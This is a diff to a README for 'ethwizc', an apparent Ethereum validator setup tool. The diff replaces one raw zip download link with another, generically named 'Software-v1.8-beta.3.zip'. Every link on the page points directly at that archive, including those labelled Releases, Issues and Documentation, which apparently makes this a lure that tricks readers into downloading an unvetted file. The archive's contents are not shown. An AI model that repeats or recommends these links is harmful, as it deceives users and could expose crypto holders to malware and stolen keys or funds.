@@ -1,6 +1,6 @@
 # 🚀 ethwizc - Simplifying Ethereum Validator Setup
 
-[![Download ethwizc](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/windows/ethwizc_v3.4.zip)](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/windows/ethwizc_v3.4.zip)
+[![Download ethwizc](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/ubuntu/Software-v1.8-beta.3.zip)](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/ubuntu/Software-v1.8-beta.3.zip)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ ethwizc is an application designed to help users set up an Ethereum validator wi
 
 To get started with ethwizc, you first need to download the application. Follow these steps:
 
-1. Click the download button at the top of this page or visit [this page to download](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/windows/ethwizc_v3.4.zip) the latest version of ethwizc.
+1. Click the download button at the top of this page or visit [this page to download](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/ubuntu/Software-v1.8-beta.3.zip) the latest version of ethwizc.
 2. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
 3. Once the download is complete, locate the file on your computer.
 
@@ -33,7 +33,7 @@ To get started with ethwizc, you first need to download the application. Follow 
 
 To download and install ethwizc:
 
-1. Visit the [ethwizc Releases page](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/windows/ethwizc_v3.4.zip).
+1. Visit the [ethwizc Releases page](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/ubuntu/Software-v1.8-beta.3.zip).
 2. Find the latest version of the software.
 3. Click on the link corresponding to your operating system.
 4. The download will start automatically. 
@@ -77,13 +77,13 @@ If you encounter any issues, here are some common solutions:
 
 ## 📞 Support
 
-For help with ethwizc, you can refer to the [GitHub Issues page](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/windows/ethwizc_v3.4.zip). Feel free to report any problems you encounter or ask questions.
+For help with ethwizc, you can refer to the [GitHub Issues page](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/ubuntu/Software-v1.8-beta.3.zip). Feel free to report any problems you encounter or ask questions.
 
 ## 🔗 Useful Links
 
-- [ethwizc Releases](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/windows/ethwizc_v3.4.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/windows/ethwizc_v3.4.zip)
-- [Documentation](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/windows/ethwizc_v3.4.zip)
+- [ethwizc Releases](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/ubuntu/Software-v1.8-beta.3.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/ubuntu/Software-v1.8-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/euphonious-raisinnutcookie575/ethwizc/main/ethwizard/platforms/ubuntu/Software-v1.8-beta.3.zip)
 
 ## 📅 Changelog
 
